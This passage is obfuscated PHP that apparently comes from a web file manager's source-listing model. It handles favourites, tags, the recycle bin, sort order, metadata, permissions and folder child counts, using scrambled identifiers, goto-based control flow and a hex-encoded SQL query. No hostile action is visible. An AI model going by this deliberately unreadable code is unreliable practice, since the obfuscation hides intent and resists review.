$A™»¡Ù¾Çğ = false) { goto d„´ïÎ¶Õ«; câ‡Ö°ù­: if (!$dÁƒô˜Û‘¯) { return array(); } $F™ÏÈ·¹»ì = $this->where(array($f™‡¥†ï´‚[378] => array($f™‡¥†ï´‚[7], $dÁƒô˜Û‘¯)))->select(); $this->_listDataApply($F™ÏÈ·¹»ì, $A™»¡Ù¾Çğ); goto fˆ£Åò¢İ¦; fˆ£Åò¢İ¦: return array_to_keyvalue($F™ÏÈ·¹»ì, $f™‡¥†ï´‚[378]); goto f†ø –‘¼º; d„´ïÎ¶Õ«: $f™‡¥†ï´‚ =& $_SERVER[í…¶]; $dÁƒô˜Û‘¯ = $dÁƒô˜Û‘¯ ? $dÁƒô˜Û‘¯ : array(); $dÁƒô˜Û‘¯ = array_filter(array_unique($dÁƒô˜Û‘¯)); goto câ‡Ö°ù­; f†ø –‘¼º: } public function pathInfoFilter($BØ„ Öİ–) { goto eÍÌ‰´ˆêá; BŠŞôÏÄ…¨: if (isset($BØ„ Öİ–[$BàÇÅ÷ŞÅö[385]]) && $BØ„ Öİ–[$BàÇÅ÷ŞÅö[385]][$BàÇÅ÷ŞÅö[386]] == -1) { $BÖóÓĞ§¥Ä = array_remove_value($BÖóÓĞ§¥Ä, $BàÇÅ÷ŞÅö[187]); $BÖóÓĞ§¥Ä = array_remove_value($BÖóÓĞ§¥Ä, $BàÇÅ÷ŞÅö[107]); $BÖóÓĞ§¥Ä = array_remove_value($BÖóÓĞ§¥Ä, $BàÇÅ÷ŞÅö[387]); $BÖóÓĞ§¥Ä = array_remove_value($BÖóÓĞ§¥Ä, $BàÇÅ÷ŞÅö[388]); $BÖóÓĞ§¥Ä = array_remove_value($BÖóÓĞ§¥Ä, $BàÇÅ÷ŞÅö[77]); $BÖóÓĞ§¥Ä = array_remove_value($BÖóÓĞ§¥Ä, $BàÇÅ÷ŞÅö[389]); } $BØ„ Öİ– = array_field_key($BØ„ Öİ–, $BÖóÓĞ§¥Ä); return $BØ„ Öİ–; goto b‰‰ò„¸Ô; c•‰«‘¶İ†: $BØ„ Öİ–[$BàÇÅ÷ŞÅö[380]] = $this->typeName($BØ„ Öİ–[$BàÇÅ÷ŞÅö[380]]); if ($BØ„ Öİ–[$BàÇÅ÷ŞÅö[379]] != 1) { $BØ„ Öİ–[$BàÇÅ÷ŞÅö[160]] = $BØ„ Öİ–[$BàÇÅ÷ŞÅö[381]]; unset($BØ„ Öİ–[$BàÇÅ÷ŞÅö[381]]); } $AËœ†¯™÷¸ = $BàÇÅ÷ŞÅö[382]; goto c–¹â½¾; c–¹â½¾: $AËœ†¯™÷¸ .= $BàÇÅ÷ŞÅö[383]; $AËœ†¯™÷¸ .= $BàÇÅ÷ŞÅö[384]; $BÖóÓĞ§¥Ä = explode($BàÇÅ÷ŞÅö[47], $AËœ†¯™÷¸); goto BŠŞôÏÄ…¨; eÍÌ‰´ˆêá: $BàÇÅ÷ŞÅö =& $_SERVER[í…¶]; $BØ„ Öİ–[$BàÇÅ÷ŞÅö[75]] = KodIO::make($BØ„ Öİ–[$BàÇÅ÷ŞÅö[378]]); $BØ„ Öİ–[$BàÇÅ÷ŞÅö[29]] = $BØ„ Öİ–[$BàÇÅ÷ŞÅö[379]] == 1 ? $BàÇÅ÷ŞÅö[76] : $BàÇÅ÷ŞÅö[167]; goto c•‰«‘¶İ†; b‰‰ò„¸Ô: } public function listUserFav() { goto a¶®ŞåÓÊµ; AºÆ¤ŠÓ²Š: foreach ($aãÑÁÌóÊ™ as &$FÛËÑ÷—ã) { $FÛËÑ÷—ã = array($bê°É•ã„î[394] => $FÛËÑ÷—ã[$bê°É•ã„î[376]], $bê°É•ã„î[395] => $FÛËÑ÷—ã[$bê°É•ã„î[28]], $bê°É•ã„î[396] => $FÛËÑ÷—ã[$bê°É•ã„î[75]], $bê°É•ã„î[397] => $FÛËÑ÷—ã[$bê°É•ã„î[29]], $bê°É•ã„î[398] => $FÛËÑ÷—ã[$bê°É•ã„î[187]], $bê°É•ã„î[399] => $FÛËÑ÷—ã[$bê°É•ã„î[107]]); if ($FÛËÑ÷—ã[$bê°É•ã„î[29]] == $bê°É•ã„î[391] && $bõë§¼¤ß÷[$FÛËÑ÷—ã[$bê°É•ã„î[75]]]) { $FÛËÑ÷—ã[$bê°É•ã„î[400]] = $bõë§¼¤ß÷[$FÛËÑ÷—ã[$bê°É•ã„î[75]]]; } } return $aãÑÁÌóÊ™; goto B†„µŒÔèÖ; a¶®ŞåÓÊµ: $bê°É•ã„î =& $_SERVER[í…¶]; $aãÑÁÌóÊ™ = Model($bê°É•ã„î[390])->listData(); $a§âÕ¸Êªˆ = array_filter_by_field($aãÑÁÌóÊ™, $bê°É•ã„î[29], $bê°É•ã„î[391]); goto eœ±áŞÌ; eœ±áŞÌ: $a§âÕ¸Êªˆ = array_to_keyvalue($a§âÕ¸Êªˆ, $bê°É•ã„î[33], $bê°É•ã„î[75]); if ($a§âÕ¸Êªˆ) { $bõë§¼¤ß÷ = $this->listSource(array($bê°É•ã„î[392] => array($bê°É•ã„î[393], $a§âÕ¸Êªˆ))); } $bõë§¼¤ß÷ = array_to_keyvalue($bõë§¼¤ß÷[$bê°É•ã„î[363]], $bê°É•ã„î[378]); goto AºÆ¤ŠÓ²Š; B†„µŒÔèÖ: } public function listUserTag($AÁÆÁä²‘¼) { goto C×ç‡à‡ªÙ; bÄÉ¬‘±÷: $this->listUserTagClear($d°°Íİä, $bƒºí‘ùÁ, $AÁÆÁä²‘¼); return $bƒºí‘ùÁ; goto c‰‡à‚¿Ş¯; C×ç‡à‡ªÙ: $eîî­Å²ÜŞ =& $_SERVER[í…¶]; $fğ•·Ò˜ŞÏ = Model($eîî­Å²ÜŞ[401])->listData(); $d°°Íİä = array_filter_by_field($fğ•·Ò˜ŞÏ, $eîî­Å²ÜŞ[402], $AÁÆÁä²‘¼); goto eçç÷°ğÉí; eçç÷°ğÉí: $d°°Íİä = array_to_keyvalue($d°°Íİä, $eîî­Å²ÜŞ[33], $eîî­Å²ÜŞ[75]); $bƒºí‘ùÁ = array(); if ($d°°Íİä) { $Aò«¡¼ìâ = array($eîî­Å²ÜŞ[392] => array($eîî­Å²ÜŞ[393], $d°°Íİä)); $bƒºí‘ùÁ = $this->listSource($Aò«¡¼ìâ); } goto bÄÉ¬‘±÷; c‰‡à‚¿Ş¯: } private function listUserTagClear($eÂÅ…ÂÄœ, $d×ÏéÄìôÓ, $b„Ş…Ö’ Ş) { goto CŸ£¨¿õã×; c…Ê«†ºÖ: $eØİ£ßá¬² = array_merge($aÒÉ’ÒØß¡, $DŒêŒÄˆÊ‚); foreach ($eÂÅ…ÂÄœ as $CÄƒÈ´Şƒ) { if (!in_array($CÄƒÈ´Şƒ, $eØİ£ßá¬²)) { $d…•°½§†[] = $CÄƒÈ´Şƒ; } } if (!$d…•°½§†) { return; } goto dƒƒ¢†àñæ; BØ¾ÈÕˆ: $d…•°½§† = array(); $DŒêŒÄˆÊ‚ = array_to_keyvalue($d×ÏéÄìôÓ[$fí²§íÛ¨·[74]], $fí²§íÛ¨·[33], $fí²§íÛ¨·[378]); $aÒÉ’ÒØß¡ = array_to_keyvalue($d×ÏéÄìôÓ[$fí²§íÛ¨·[73]], $fí²§íÛ¨·[33], $fí²§íÛ¨·[378]); goto c…Ê«†ºÖ; CŸ£¨¿õã×: $fí²§íÛ¨· =& $_SERVER[í…¶]; if (!$eÂÅ…ÂÄœ) { return; } if ($d×ÏéÄìôÓ && count($eÂÅ…ÂÄœ) == $d×ÏéÄìôÓ[$fí²§íÛ¨·[360]][$fí²§íÛ¨·[361]]) { return; } goto BØ¾ÈÕˆ; dƒƒ¢†àñæ: Model($fí²§íÛ¨·[403])->removeFromTag($d…•°½§†, $b„Ş…Ö’ Ş); goto f‡³Ó¶ù—ê; f‡³Ó¶ù—ê: } public function listUserRecycle() { $a¶Øááº‹ =& $_SERVER[í…¶]; $cò«‚‰â¼¬ = Model($a¶Øááº‹[404])->listData(); if (!$cò«‚‰â¼¬) { return array(); } $Eò¡¾»¤é¨ = array($a¶Øááº‹[392] => array($a¶Øááº‹[393], $cò«‚‰â¼¬), $a¶Øááº‹[405] => 1); return $this->listSource($Eò¡¾»¤é¨); } public function listSource($CÃÍˆ‰ó„©, $Fˆä›¶ƒñª = 3000) { goto E¹°ô¦Õ½„; aºâªÆò‹: return $B«ÄÛƒ¿Õ; goto BÁ¨çôêèÀ; C÷‘×òç±§: $B«ÄÛƒ¿Õ = $this->field($dèğ†ì—Æù)->_makeOrder()->where($CÃÍˆ‰ó„©)->selectPage($Fˆä›¶ƒñª); $this->_listDataApply($B«ÄÛƒ¿Õ[$b·¦Œôîâê[363]]); $this->_listMake($B«ÄÛƒ¿Õ); goto aºâªÆò‹; E¹°ô¦Õ½„: $b·¦Œôîâê =& $_SERVER[í…¶]; if (!isset($CÃÍˆ‰ó„©[$b·¦Œôîâê[406]])) { $CÃÍˆ‰ó„©[$b·¦Œôîâê[406]] = 0; } $dèğ†ì—Æù = $b·¦Œôîâê[407]; goto C÷‘×òç±§; BÁ¨çôêèÀ: } protected function _makeOrder() { goto a¾ëŠÚ‰İ; d¢—¶Ÿ†‹Á: if ($DêÔß·£®» == $E„İÖó“’Í[28]) { } $DŞ‹•­ô• = $E„İÖó“’Í[418] . $Fİ¿—³‚õä[$DêÔß·£®»] . $E„İÖó“’Í[50] . $EÁòç¿ç„è[$C†Ğ‰‚Œ¾ã]; return $this->order(rtrim(trim($DŞ‹•­ô•), $E„İÖó“’Í[47])); goto c®Ê’¸ÂĞ; a¾ëŠÚ‰İ: $E„İÖó“’Í =& $_SERVER[í…¶]; $fààˆ—Ò—• = Model($E„İÖó“’Í[408])->get($E„İÖó“’Í[409]); $C™ÛêõŠø = Model($E„İÖó“’Í[408])->get($E„İÖó“’Í[410]); goto cÏ¹´±“á; cÏ¹´±“á: $EÁòç¿ç„è = array($E„İÖó“’Í[411] => $E„İÖó“’Í[412], $E„İÖó“’Í[413] => $E„İÖó“’Í[414]); $Fİ¿—³‚õä = array($E„İÖó“’Í[28] => $E„İÖó“’Í[28], $E„İÖó“’Í[77] => $E„İÖó“’Í[77], $E„İÖó“’Í[160] => $E„İÖó“’Í[381], $E„İÖó“’Í[387] => $E„İÖó“’Í[387], $E„İÖó“’Í[415] => $E„İÖó“’Í[388], $E„İÖó“’Í[187] => $E„İÖó“’Í[187], $E„İÖó“’Í[107] => $E„İÖó“’Í[107]); $DêÔß·£®» = Input::get($E„İÖó“’Í[416], $E„İÖó“’Í[7], $fààˆ—Ò—•, array_keys($Fİ¿—³‚õä)); goto A†¢ˆœ½±²; A†¢ˆœ½±²: $C†Ğ‰‚Œ¾ã = Input::get($E„İÖó“’Í[417], $E„İÖó“’Í[7], $C™ÛêõŠø, array_keys($EÁòç¿ç„è)); if (!in_array($DêÔß·£®», array_keys($Fİ¿—³‚õä))) { $DêÔß·£®» = $E„İÖó“’Í[28]; } if (!in_array($C†Ğ‰‚Œ¾ã, array_keys($EÁòç¿ç„è))) { $DêÔß·£®» = $E„İÖó“’Í[411]; } goto d¢—¶Ÿ†‹Á; c®Ê’¸ÂĞ: } protected function _listDataApplyItem($b‡Š®Ùƒ¹ó, $CÊÚáğÖ = false) { $B†‡àÎŒä¼ = array($b‡Š®Ùƒ¹ó); $this->_listDataApply($B†‡àÎŒä¼, $CÊÚáğÖ); return $B†‡àÎŒä¼[0]; } protected function _listDataApply(&$E×Ü¹Æô·ç, $f‚¬ÏàÄŒä = false) { goto c®Æ·ìğ; E¸ïó§ĞÆÌ: $B£ˆ¬ºÃ‚Ì = array_unique($B£ˆ¬ºÃ‚Ì); $this->_listSourceCache($E×Ü¹Æô·ç); if (!$f‚¬ÏàÄŒä) { $this->_listAppendMeta($E×Ü¹Æô·ç, $B£ˆ¬ºÃ‚Ì); $this->_listAppendFileMeta($E×Ü¹Æô·ç, $B£ˆ¬ºÃ‚Ì); $this->_listAppendChildren($E×Ü¹Æô·ç, $B£ˆ¬ºÃ‚Ì); } goto bÙáùùóÒ; D¯Š­ˆˆ™ö: $this->_listAppendUser($E×Ü¹Æô·ç); $this->_listFilterInfo($E×Ü¹Æô·ç, $f‚¬ÏàÄŒä); goto A«Ü‹¾Ô•‹; bÙáùùóÒ: $this->_listAppendPath($E×Ü¹Æô·ç); $this->_listAppendAuth($E×Ü¹Æô·ç); $this->_listAppendSourceInfo($E×Ü¹Æô·ç, $B£ˆ¬ºÃ‚Ì); goto D¯Š­ˆˆ™ö; c®Æ·ìğ: $cÔ‚Õ¸¨ğã =& $_SERVER[í…¶]; if (!$E×Ü¹Æô·ç) { $E×Ü¹Æô·ç = array(); return; } $B£ˆ¬ºÃ‚Ì = array_to_keyvalue($E×Ü¹Æô·ç, $cÔ‚Õ¸¨ğã[33], $cÔ‚Õ¸¨ğã[378]); goto E¸ïó§ĞÆÌ; A«Ü‹¾Ô•‹: } protected function _listSourceCache($dª¦Å‘ğ©) { $bº¤œìöçÑ =& $_SERVER[í…¶]; foreach ($dª¦Å‘ğ© as $D×†ŒáÕ£) { self::$cacheSourceInfo[$bº¤œìöçÑ[419] . $D×†ŒáÕ£[$bº¤œìöçÑ[378]]] = $D×†ŒáÕ£; } } protected function _listFilterInfo(&$d÷»Ìİ‰‰ä, $d¹Ü§„»Î— = false) { $fµ¢¦È¼£¨ =& $_SERVER[í…¶]; foreach ($d÷»Ìİ‰‰ä as &$a‰ØÛÀò‰–) { $a‰ØÛÀò‰– = $this->pathInfoFilter($a‰ØÛÀò‰–); self::$cachePathInfo[$fµ¢¦È¼£¨[420] . intval($d¹Ü§„»Î—) . $fµ¢¦È¼£¨[421] . $a‰ØÛÀò‰–[$fµ¢¦È¼£¨[378]]] = $a‰ØÛÀò‰–; } } protected function _listMake(&$aªÔÕĞšßñ) { $FÓ¶ÕÎ’ÜŒ =& $_SERVER[í…¶]; $aªÔÕĞšßñ[$FÓ¶ÕÎ’ÜŒ[74]] = array(); $aªÔÕĞšßñ[$FÓ¶ÕÎ’ÜŒ[73]] = array(); foreach ($aªÔÕĞšßñ[$FÓ¶ÕÎ’ÜŒ[363]] as $dÎêĞ‰Í‹ ) { $e‰¸¬ßÇÁ = $dÎêĞ‰Í‹ [$FÓ¶ÕÎ’ÜŒ[379]] == 1 ? $FÓ¶ÕÎ’ÜŒ[74] : $FÓ¶ÕÎ’ÜŒ[73]; $aªÔÕĞšßñ[$e‰¸¬ßÇÁ][] = $dÎêĞ‰Í‹ ; } unset($aªÔÕĞšßñ[$FÓ¶ÕÎ’ÜŒ[363]]); } protected function _listAppendMeta(&$DØ­ÕŠé£°, $cèÍƒƒ¼ô) { goto B‘ŸÄèï×‡; B‘ŸÄèï×‡: $b…È’„¬•ˆ =& $_SERVER[í…¶]; $F‘§à‰ÌòÄ = array($b…È’„¬•ˆ[392] => array($b…È’„¬•ˆ[393], $cèÍƒƒ¼ô)); $f»ø§ôÀƒ = Model($b…È’„¬•ˆ[422])->field($b…È’„¬•ˆ[423])->where($F‘§à‰ÌòÄ)->select(); goto fÅƒ•¦Â¡; DòÜÈÅˆ–³: foreach ($f»ø§ôÀƒ as $c‡‰ßƒ–—ã) { if (!isset($d›¹¿ö×ÏÔ[$c‡‰ßƒ–—ã[$b…È’„¬•ˆ[378]]])) { $d›¹¿ö×ÏÔ[$c‡‰ßƒ–—ã[$b…È’„¬•ˆ[378]]] = array(); } if (in_array($c‡‰ßƒ–—ã[$b…È’„¬•ˆ[89]], $dœ®îğù¿)) { continue; } $d›¹¿ö×ÏÔ[$c‡‰ßƒ–—ã[$b…È’„¬•ˆ[378]]][$c‡‰ßƒ–—ã[$b…È’„¬•ˆ[89]]] = $c‡‰ßƒ–—ã[$b…È’„¬•ˆ[368]]; } foreach ($DØ­ÕŠé£° as &$a„Ï¹­´á) { $a„Ï¹­´á[$b…È’„¬•ˆ[426]] = !1; if (isset($d›¹¿ö×ÏÔ[$a„Ï¹­´á[$b…È’„¬•ˆ[378]]])) { $a„Ï¹­´á[$b…È’„¬•ˆ[426]] = $d›¹¿ö×ÏÔ[$a„Ï¹­´á[$b…È’„¬•ˆ[378]]]; } if ($this->fileIsLock($a„Ï¹­´á) && $a„Ï¹­´á[$b…È’„¬•ˆ[385]]) { $CÌ¬ÃÉïß = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $a„Ï¹­´á[$b…È’„¬•ˆ[385]][$b…È’„¬•ˆ[386]] = AuthModel::authDisable($a„Ï¹­´á[$b…È’„¬•ˆ[385]][$b…È’„¬•ˆ[386]], $CÌ¬ÃÉïß); $a„Ï¹­´á[$b…È’„¬•ˆ[385]][$b…È’„¬•ˆ[427]][$b…È’„¬•ˆ[385]] = $a„Ï¹­´á[$b…È’„¬•ˆ[385]][$b…È’„¬•ˆ[386]]; } } goto eÔ±„Ïö÷”; fÅƒ•¦Â¡: if (!$f»ø§ôÀƒ) { return; } $dœ®îğù¿ = array($b…È’„¬•ˆ[424], $b…È’„¬•ˆ[425]); $d›¹¿ö×ÏÔ = array(); goto DòÜÈÅˆ–³; eÔ±„Ïö÷”: } protected function _listAppendFileMeta(&$A¬¨‚“›£ø, $fâñŒ½¢‘) { goto f´ùš¹¯™¬; dÄ¦ëºº‡ë: if (!$D†¤ÙÜ·³) { return; } $C¼Úİì«â× = array($E´½Î‘¤‡[429] => array($E´½Î‘¤‡[393], $D†¤ÙÜ·³)); $FßãÑÇŒñ¤ = $E´½Î‘¤‡[430]; goto B«Å‡Ü¬«; B«Å‡Ü¬«: $F„¦Ú·«ÇÍ = Model($E´½Î‘¤‡[431])->field($FßãÑÇŒñ¤)->where($C¼Úİì«â×)->select(); $F„¦Ú·«ÇÍ = array_to_keyvalue($F„¦Ú·«ÇÍ, $E´½Î‘¤‡[428]); $EšíàÄ†ô” = Model($E´½Î‘¤‡[432])->field($E´½Î‘¤‡[433])->where($C¼Úİì«â×)->select(); goto e¿ÜÈƒ–Ù—; f´ùš¹¯™¬: $E´½Î‘¤‡ =& $_SERVER[í…¶]; $D†¤ÙÜ·³ = array_to_keyvalue($A¬¨‚“›£ø, $E´½Î‘¤‡[33], $E´½Î‘¤‡[428]); $D†¤ÙÜ·³ = array_filter(array_unique($D†¤ÙÜ·³)); goto dÄ¦ëºº‡ë; e¿ÜÈƒ–Ù—: $EšíàÄ†ô” = $EšíàÄ†ô” ? $EšíàÄ†ô” : array(); $b“¼×•‚¼ö = array(); foreach ($EšíàÄ†ô” as $AñÂÏ”…†…) { if (!isset($b“¼×•‚¼ö[$AñÂÏ”…†…[$E´½Î‘¤‡[428]]])) { $b“¼×•‚¼ö[$AñÂÏ”…†…[$E´½Î‘¤‡[428]]] = array(); } $b“¼×•‚¼ö[$AñÂÏ”…†…[$E´½Î‘¤‡[428]]][$AñÂÏ”…†…[$E´½Î‘¤‡[89]]] = $AñÂÏ”…†…[$E´½Î‘¤‡[368]]; } goto aº•¬Êãê; aº•¬Êãê: foreach ($A¬¨‚“›£ø as &$e±•ÇÌÕƒ¢) { goto b°­Ü¾ğ‹Æ; b°­Ü¾ğ‹Æ: $fàÂçó“Ä§ = $e±•ÇÌÕƒ¢[$E´½Î‘¤‡[428]]; if (!$fàÂçó“Ä§ || !isset($F„¦Ú·«ÇÍ[$fàÂçó“Ä§])) { continue; } $FÜ¾ùÑ”æì = $F„¦Ú·«ÇÍ[$fàÂçó“Ä§]; goto bÛÆÀÆ§éÖ; bÛÆÀÆ§éÖ: $FÜ¾ùÑ”æì[$E´½Î‘¤‡[77]] = $e±•ÇÌÕƒ¢[$E´½Î‘¤‡[77]]; $FÜ¾ùÑ”æì[$E´½Î‘¤‡[28]] = $e±•ÇÌÕƒ¢[$E´½Î‘¤‡[28]]; self::$cacheFileInfo[$E´½Î‘¤‡[434] . $fàÂçó“Ä§] = $FÜ¾ùÑ”æì; goto e¢ÍÌÜ¥ëŸ; e¢ÍÌÜ¥ëŸ: unset($F„¦Ú·«ÇÍ[$fàÂçó“Ä§][$E´½Î‘¤‡[75]]); $EÕ¼È˜óŒ = is_array($b“¼×•‚¼ö[$fàÂçó“Ä§]) ? $b“¼×•‚¼ö[$fàÂçó“Ä§] : array(); $e±•ÇÌÕƒ¢[$E´½Î‘¤‡[162]] = array_merge($EÕ¼È˜óŒ, $F„¦Ú·«ÇÍ[$fàÂçó“Ä§]); goto fÎ»»„ºœë; fÎ»»„ºœë: if (isset($e±•ÇÌÕƒ¢[$E´½Î‘¤‡[162]][$E´½Î‘¤‡[435]])) { $e±•ÇÌÕƒ¢[$E´½Î‘¤‡[435]] = json_decode($e±•ÇÌÕƒ¢[$E´½Î‘¤‡[162]][$E´½Î‘¤‡[435]], !0); unset($e±•ÇÌÕƒ¢[$E´½Î‘¤‡[162]][$E´½Î‘¤‡[435]]); } goto c±÷Ôè±ª; c±÷Ôè±ª: } goto c—ğÃÆï†á; c—ğÃÆï†á: } protected function _listAppendSourceInfo(&$bÉàíÚù£¨, $BğŒ†Š¶­É) { goto Eš³Ÿ±ïƒÈ; AƒÍßêñ‡: $aàä¾ŠÛ»– = array_to_keyvalue_group($b³¡´’—îç, $FİôÆ½¼í[378]); foreach ($bÉàíÚù£¨ as &$c˜êÁõŸØ) { $c˜êÁõŸØ[$FİôÆ½¼í[400]] = array($FİôÆ½¼í[439] => 0, $FİôÆ½¼í[440] => 0, $FİôÆ½¼í[441] => 0); if (isset($bÂ—öÏÆî‰[$c˜êÁõŸØ[$FİôÆ½¼í[378]]])) { $c˜êÁõŸØ[$FİôÆ½¼í[400]][$FİôÆ½¼í[442]] = 1; $c˜êÁõŸØ[$FİôÆ½¼í[400]][$FİôÆ½¼í[443]] = $bÂ—öÏÆî‰[$c˜êÁõŸØ[$FİôÆ½¼í[378]]][$FİôÆ½¼í[28]]; } if (isset($eï“ŠâáÍ«[$c˜êÁõŸØ[$FİôÆ½¼í[378]]])) { $c˜êÁõŸØ[$FİôÆ½¼í[400]][$FİôÆ½¼í[444]] = array(); foreach ($eï“ŠâáÍ«[$c˜êÁõŸØ[$FİôÆ½¼í[378]]] as $e•¯œò—ğ) { $A´‰±ãŒ‚Í = $bÇÆ£¼ÏŒ[$e•¯œò—ğ]; $c˜êÁõŸØ[$FİôÆ½¼í[400]][$FİôÆ½¼í[444]][] = array($FİôÆ½¼í[445] => $A´‰±ãŒ‚Í[$FİôÆ½¼í[376]], $FİôÆ½¼í[395] => $A´‰±ãŒ‚Í[$FİôÆ½¼í[28]], $FİôÆ½¼í[446] => $A´‰±ãŒ‚Í[$FİôÆ½¼í[447]]); } } if (isset($aàä¾ŠÛ»–[$c˜êÁõŸØ[$FİôÆ½¼í[378]]])) { $c˜êÁõŸØ[$FİôÆ½¼í[400]][$FİôÆ½¼í[448]] = array(); foreach ($aàä¾ŠÛ»–[$c˜êÁõŸØ[$FİôÆ½¼í[378]]] as $cíÁöİì‰) { $c˜êÁõŸØ[$FİôÆ½¼í[400]][$FİôÆ½¼í[448]] = array($FİôÆ½¼í[449] => $cíÁöİì‰[$FİôÆ½¼í[450]], $FİôÆ½¼í[451] => $cíÁöİì‰[$FİôÆ½¼í[452]], $FİôÆ½¼í[453] => $cíÁöİì‰[$FİôÆ½¼í[378]], $FİôÆ½¼í[454] => $cíÁöİì‰[$FİôÆ½¼í[455]], $FİôÆ½¼í[456] => $cíÁöİì‰[$FİôÆ½¼í[457]]); } } } return $bÉàíÚù£¨; goto DŞñ¿˜„æø; Eš³Ÿ±ïƒÈ: $FİôÆ½¼í =& $_SERVER[í…¶]; if (!defined($FİôÆ½¼í[436])) { return; } $Cˆ»öƒèˆ = Model($FİôÆ½¼í[437])->listData(); goto AåàÂæğŠ; B²•‡ç‘’­: $bÇÆ£¼ÏŒ = array_to_keyvalue($Cˆ»öƒèˆ, $FİôÆ½¼í[376]); $eï“ŠâáÍ« = array_to_keyvalue_group($b¶ŠŒ³‚Ø™, $FİôÆ½¼í[75], $FİôÆ½¼í[402]); $bÂ—öÏÆî‰ = array_to_keyvalue($fƒ­Î§ç¤ò, $FİôÆ½¼í[75]); goto AƒÍßêñ‡; AåàÂæğŠ: $b¶ŠŒ³‚Ø™ = Model($FİôÆ½¼í[401])->listData(); $fƒ­Î§ç¤ò = Model($FİôÆ½¼í[390])->listData(); $b³¡´’—îç = Model($FİôÆ½¼í[438])->listSimple(); goto B²•‡ç‘’­; DŞñ¿˜„æø: } protected function _listAppendChildren(&$C¼Ê…†, $Aˆ¿´‹…åƒ) { goto C½÷Ù¹ÓÀ‡; d¤¸ê“ÉÅÚ: $BÊğ„Ññå³ = $this->tablePrefix . $this->tableName; for ($eéŒÌ¼Ö… = 0; $eéŒÌ¼Ö… < $cáÔ‘ßÑ¬; $eéŒÌ¼Ö…++) { $b‹Ã¦µ§çÀ = intval($C¼Ê…†[$eéŒÌ¼Ö…][$B´¦Ï¡ÑÔÁ[406]]); if ($C¼Ê…†[$eéŒÌ¼Ö…][$B´¦Ï¡ÑÔÁ[379]]) { $aŒÓéÒ¿«º = $C¼Ê…†[$eéŒÌ¼Ö…][$B´¦Ï¡ÑÔÁ[378]]; $a·£ªùÛÎŒ .= "\123\x45\114\x45\103\124\x20\x2a\x20\106\122\x4f\x4d\40\50\123\x45\x4c\x45\103\124\40\x27{$aŒÓéÒ¿«º}\x5f\150\141\163\106\x69\154\x65\x27\40\x61\163\x20\150\x61\163\x2c\143\x6f\165\156\x74\x28\61\51\x20\141\163\x20\x68\141\x73\103\x6f\x75\156\x74\x20\x46\x52\117\115\40\140{$BÊğ„Ññå³}\x60\40\xa\11\11\11\x9\x9\x77\150\145\162\145\x20\x70\141\x72\145\x6e\x74\111\104\x3d{$aŒÓéÒ¿«º}\40\x61\x6e\144\40\x69\163\106\157\x6c\144\145\162\75\x30\40\x61\x6e\x64\40\x69\x73\104\145\x6c\x65\x74\x65\75{$b‹Ã¦µ§çÀ}\x29\x20\x61\163\40\x74\x62\61\137{$aŒÓéÒ¿«º}\40\x75\x6e\x69\x6f\156\x20\141\154\x6c\x20\12\11\11\x9\11\x9\x53\x45\x4c\105\103\x54\x20\x2a\40\x46\x52\x4f\115\x20\50\123\105\114\x45\103\x54\40\x27{$aŒÓéÒ¿«º}\137\x68\141\x73\x46\x6f\154\x64\x65\162\x27\x20\x61\x73\40\x68\x61\x73\106\x69\154\145\54\x63\157\x75\x6e\164\50\x31\x29\40\x61\x73\40\x68\x61\163\x43\157\x75\156\x74\40\x46\x52\117\x4d\x20\x60{$BÊğ„Ññå³}\140\x20\12\11\11\x9\x9\11\x77\x68\145\162\x65\40\x70\x61\162\145\156\x74\111\x44\x3d{$aŒÓéÒ¿«º}\40\x61\x6e\x64\x20\151\x73\x46\x6f\x6c\x64\x65\x72\75\x31\40\x61\156\144\x20\x69\x73\104\x65\154\x65\164\x65\x3d{$b‹Ã¦µ§çÀ}\51\x20\141\x73\40\x74\x62\62\137{$aŒÓéÒ¿«º}\x20\x75\x6e\151\157\156\x20\x61\x6c\x6c\x20"; } if ((strlen($a·£ªùÛÎŒ) >= $fçïİêêÔ– || $eéŒÌ¼Ö… == $cáÔ‘ßÑ¬ - 1) && $a·£ªùÛÎŒ) { $a·£ªùÛÎŒ = substr($a·£ªùÛÎŒ, 0, -strlen($B´¦Ï¡ÑÔÁ[458])); $E‹­œÈİ­ = $this->query($a·£ªùÛÎŒ); $b¦õõ›¼‚ô = array_merge($b¦õõ›¼‚ô, $E‹­œÈİ­); $a·£ªùÛÎŒ = $B´¦Ï¡ÑÔÁ[33]; } } $b¦õõ›¼‚ô = array_to_keyvalue($b¦õõ›¼‚ô, $B´¦Ï¡ÑÔÁ[459]); goto C‚Ã‚»¥µ¬; B‚·ê—¹„Û: $fçïİêêÔ– = 1024 * 50; $C¼Ê…† = is_array($C¼Ê…†) ? $C¼Ê…† : array(); $cáÔ‘ßÑ¬ = count($C¼Ê…†); goto d¤¸ê“ÉÅÚ; C‚Ã‚»¥µ¬: foreach ($C¼Ê…† as &$cÆ¶§âÉÊÏ) { if ($cÆ¶§âÉÊÏ[$B´¦Ï¡ÑÔÁ[379]]) { unset($cÆ¶§âÉÊÏ[$B´¦Ï¡ÑÔÁ[381]]); $cÆ¶§âÉÊÏ[$B´¦Ï¡ÑÔÁ[192]] = intval($b¦õõ›¼‚ô[$cÆ¶§âÉÊÏ[$B´¦Ï¡ÑÔÁ[378]] . $B´¦Ï¡ÑÔÁ[460]][$B´¦Ï¡ÑÔÁ[461]]); $cÆ¶§âÉÊÏ[$B´¦Ï¡ÑÔÁ[191]] = intval($b¦õõ›¼‚ô[$cÆ¶§âÉÊÏ[$B´¦Ï¡ÑÔÁ[378]] . $B´¦Ï¡ÑÔÁ[462]][$B´¦Ï¡ÑÔÁ[461]]); } } goto d„¯‹‚÷¨¦; C½÷Ù¹ÓÀ‡: $B´¦Ï¡ÑÔÁ =& $_SERVER[í…¶]; $a·£ªùÛÎŒ = $B´¦Ï¡ÑÔÁ[370]; $b¦õõ›¼‚ô = array(); goto B‚·ê—¹„Û; d„¯‹‚÷¨¦: } protected function _listAppendAuth(&$f—İ£¿É”è) { goto C™Ê£•Ê¢¯; d–›õËõØŠ: $eš×Ùî¡º‹ = Model($C—§ÓèÈ[463])->getSourceList($EšÓ‹öŠ˜Û, $eÔ…¯‚¾Œ¶); foreach ($f—İ£¿É”è as $C—œğ•”±é => &$CÖçˆĞ„¼…) { $CÖçˆĞ„¼…[$C—§ÓèÈ[385]] = $eš×Ùî¡º‹[$CÖçˆĞ„¼…[$C—§ÓèÈ[378]]]; if (!$CÖçˆĞ„¼…[$C—§ÓèÈ[385]] && $CÖçˆĞ„¼…[$C—§ÓèÈ[380]] == self::TYPE_GROUP) { $CÖçˆĞ„¼…[$C—§ÓèÈ[385]] = 